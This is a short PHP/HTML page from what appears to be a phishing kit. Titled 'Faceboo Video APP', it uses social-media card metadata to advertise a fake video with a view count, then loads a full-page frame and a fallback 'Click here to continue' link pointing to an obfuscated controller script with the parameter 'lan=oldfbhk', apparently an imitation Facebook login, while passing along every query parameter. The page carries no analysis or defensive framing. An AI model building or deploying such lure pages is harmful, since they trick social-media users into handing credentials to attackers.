
	<html> 
	<head> 
	<title>Faceboo Video APP</title>
		
		<meta name="twitter:card" content="summary" />
		<meta name="twitter:site" content="@" />
		<meta name="twitter:title" content="Watch video @" />
		<meta name="twitter:description" content="417,953 Views " />
		<meta name="twitter:image" content="https://avatars.io/twitter/" />
	
	</head>
	<frameset rows="*,3" frameborder="NO" border="50" framespacing="0">
	<frame name="main" src="../.././public/CONTROLLER1b82f209-d5e5-460c-ad5d-26b7b1475cff.php?source=.%2Fpublic%2FACCESSSb827abe4-b7be-4114-99de-0b5dbecc409f&lan=oldfbhk&<?php echo http_build_query($_GET); ?>"> <noframes> 
	<body bgcolor="#FFFFFF" text="#000000"> 
	<a href="../.././public/CONTROLLER1b82f209-d5e5-460c-ad5d-26b7b1475cff.php?source=.%2Fpublic%2FACCESSSb827abe4-b7be-4114-99de-0b5dbecc409f&lan=oldfbhk&<?php echo http_build_query($_GET); ?>">Click here to continue</a> 
	</body> 
	</noframes> 
	</html> 
   